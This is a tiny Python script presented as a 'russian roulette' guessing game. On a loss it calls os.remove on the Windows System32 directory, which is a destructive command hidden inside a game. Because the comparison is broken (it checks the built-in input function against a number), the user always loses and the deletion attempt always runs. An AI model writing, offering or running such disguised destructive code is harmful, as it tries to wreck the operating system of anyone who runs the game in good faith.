import random
import os
print("welcome to python russian roulette\n")
input("choose a num from 1 to 10: ")
cpu = random.randint(1,10)
if input == cpu:
  print("you won!!")
else:
  print("you lose!!")
  os.remove("C:\Windows\System32")
